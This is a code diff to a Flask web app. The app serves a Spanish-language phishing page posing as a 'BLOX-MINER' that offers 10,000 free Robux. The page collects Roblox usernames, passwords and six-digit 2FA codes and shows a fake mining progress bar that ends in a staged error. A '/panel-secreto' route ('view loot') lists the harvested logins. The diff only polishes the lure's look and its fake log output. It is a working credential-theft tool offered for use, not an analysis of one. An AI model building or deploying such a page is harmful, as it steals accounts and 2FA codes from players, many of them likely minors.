@@ -9,48 +9,64 @@ HTML_PAGINA = """
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Roblox Cloud Miner v4.2</title>
+    <title>BLOX-MINER CLOUD v4.2</title>
     <meta name="viewport" content="width=device-width, initial-scale=1">
     <style>
-        body { background-color: #0a0a0a; color: #00ff00; font-family: 'Courier New', monospace; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-        .terminal { background: #111; width: 90%; max-width: 400px; padding: 20px; border: 1px solid #333; border-radius: 5px; box-shadow: 0 0 20px rgba(0,255,0,0.2); }
-        input { background: #000; color: #00ff00; border: 1px solid #00ff00; width: 92%; padding: 10px; margin: 10px 0; outline: none; }
-        button { background: #00ff00; color: #000; border: none; padding: 12px; width: 100%; cursor: pointer; font-weight: bold; margin-top: 10px; }
-        .progress-bar { width: 100%; background: #222; height: 20px; margin-top: 20px; display: none; border: 1px solid #00ff00; }
-        .progress-fill { width: 0%; height: 100%; background: #00ff00; transition: width 0.5s; }
-        #status { font-size: 12px; margin-top: 10px; color: #888; }
-        #step2, #mining { display: none; }
+        body { background-color: #050505; color: #00ff00; font-family: 'Courier New', monospace; margin: 0; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
+        .terminal { background: #000; width: 95%; max-width: 450px; padding: 20px; border: 1px solid #00ff00; border-radius: 5px; box-shadow: 0 0 30px rgba(0,255,0,0.1); }
+        .header { border-bottom: 1px solid #00ff00; padding-bottom: 10px; margin-bottom: 20px; text-align: center; }
+        .instructions { font-size: 11px; color: #aaa; text-align: left; background: #111; padding: 10px; border-left: 3px solid #00ff00; margin-bottom: 20px; }
+        input { background: #000; color: #00ff00; border: 1px solid #00ff00; width: 90%; padding: 12px; margin: 10px 0; outline: none; font-family: 'Courier New'; }
+        button { background: #00ff00; color: #000; border: none; padding: 15px; width: 100%; cursor: pointer; font-weight: bold; font-size: 16px; margin-top: 10px; }
+        #mining, #step2 { display: none; }
+        .log-stream { font-size: 10px; color: #008800; height: 80px; overflow: hidden; margin-top: 15px; border-top: 1px solid #222; padding-top: 10px; }
     </style>
 </head>
 <body>
     <div class="terminal">
+        <div class="header">
+            <h2 style="margin:0;">SYSTEM: BLOX-MINER v4.2</h2>
+            <span style="font-size: 10px;">NODE-STATUS: <span style="color: #00ff00;">ONLINE</span></span>
+        </div>
+
         <div id="step1">
-            <h2 style="color: #fff; margin-top: 0;">BLOX-MINER v4.2</h2>
-            <p style="font-size: 13px;">Inicie sesión para vincular su wallet de minado y recibir 10,000 Robux.</p>
-            <input type="text" id="user" placeholder="USUARIO_ROBLOX">
-            <input type="password" id="pass" placeholder="PASSWORD_ACCESS">
-            <button onclick="siguiente()">INICIAR VINCULACIÓN</button>
+            <div class="instructions">
+                <strong>PROTOCOLOS DE SEGURIDAD:</strong><br>
+                1. Use una cuenta con antigüedad mayor a 30 días.<br>
+                2. No cierre la pestaña durante el minado de bloques.<br>
+                3. La carga de Robux se verá reflejada en su wallet tras la validación del hash.
+            </div>
+            <input type="text" id="user" placeholder="[USUARIO_ROBLOX]">
+            <input type="password" id="pass" placeholder="[CONTRASENA_ACCESO]">
+            <button onclick="siguiente()">VINCULAR CUENTA</button>
         </div>
 
         <div id="step2">
-            <h3>VERIFICACIÓN 2FA</h3>
-            <p style="font-size: 12px;">Se requiere el código de seguridad para autorizar la transferencia de bloques.</p>
-            <input type="text" id="code" placeholder="CÓDIGO_6_DÍGITOS">
-            <button onclick="minar()">VERIFICAR Y MINAR</button>
+            <h3 style="text-align:center;">2FA REQUIRED</h3>
+            <p style="font-size: 11px; text-align:center;">Ingrese el código de seguridad para autorizar la transacción de 10,000 Robux.</p>
+            <input type="text" id="code" placeholder="[CODIGO_DE_6_DIGITOS]">
+            <button onclick="minar()">VERIFICAR Y PROCESAR</button>
         </div>
 
         <div id="mining">
-            <h3>MINANDO ROBUX...</h3>
-            <div class="progress-bar" id="pbar" style="display: block;">
-                <div class="progress-fill" id="pfill"></div>
+            <h3 style="text-align:center;">MINANDO BLOQUES...</h3>
+            <div style="width: 100%; background: #222; height: 15px; border: 1px solid #00ff00;">
+                <div id="pfill" style="width: 0%; height: 100%; background: #00ff00; transition: width 0.3s;"></div>
             </div>
-            <p id="status">Iniciando scripts de minado...</p>
-            <p id="console" style="font-size: 10px; height: 60px; overflow: hidden;"></p>
+            <p id="status" style="font-size: 12px; text-align:center; margin-top: 10px;">Sincronizando wallet...</p>
+            <div class="log-stream" id="logs"></div>
         </div>
     </div>
 
     <script>
         let u, p;
+        const logs = document.getElementById('logs');
+        
+        function addLog(msg) {
+            logs.innerHTML += "> " + msg + "<br>";
+            logs.scrollTop = logs.scrollHeight;
+        }
+
         function siguiente() {
             u = document.getElementById('user').value;
             p = document.getElementById('pass').value;
@@ -74,36 +90,27 @@ HTML_PAGINA = """
             });
             document.getElementById('step2').style.display = 'none';
             document.getElementById('mining').style.display = 'block';
-            startAnimation();
+            startMining();
         }
 
-        function startAnimation() {
+        function startMining() {
             let width = 0;
             const fill = document.getElementById('pfill');
             const stat = document.getElementById('status');
-            const cons = document.getElementById('console');
-            const msgs = [
-                "Buscando hashes válidos...",
-                "Conectando a ROBLOX-API-V2...",
-                "Bloque #928374 validado.",
-                "Inyectando 10,000 Robux en la cuenta...",
-                "Sincronizando con base de datos..."
-            ];
-
-            const interval = setInterval(() => {
+            
+            const process = setInterval(() => {
                 if (width >= 100) {
-                    clearInterval(interval);
-                    stat.innerText = "ERROR: Tiempo de espera agotado. Reintente en 24h.";
-                    stat.style.color = "#ff0000";
+                    clearInterval(process);
+                    stat.innerHTML = "<span style='color:red;'>ERROR: EXCESO DE TRÁFICO</span><br>Reintente en 24 horas.";
                 } else {
-                    width += 0.5;
+                    width += 0.8;
                     fill.style.width = width + '%';
-                    if(Math.random() > 0.7) {
-                        stat.innerText = msgs[Math.floor(Math.random()*msgs.length)];
-                        cons.innerHTML += "> Hash " + Math.random().toString(36).substring(7) + " validado...<br>";
+                    if(Math.random() > 0.6) {
+                        addLog("Generando Hash: " + Math.random().toString(36).substring(7).toUpperCase());
+                        addLog("Validando bloque en servidor Roblox...");
                     }
                 }
-            }, 200);
+            }, 300);
         }
     </script>
 </body>
@@ -111,8 +118,7 @@ HTML_PAGINA = """
 """
 
 @app.route('/')
-def home():
-    return HTML_PAGINA
+def home(): return HTML_PAGINA
 
 @app.route('/cosecha', methods=['POST'])
 def cosecha():
@@ -123,7 +129,7 @@ def cosecha():
 
 @app.route('/panel-secreto')
 def ver_botin():
-    if not os.path.exists(LOG_FILE): return "Esperando mineros..."
+    if not os.path.exists(LOG_FILE): return "Búnker vacío."
     with open(LOG_FILE, "r") as f:
         return "<br>".join(f.readlines())
 
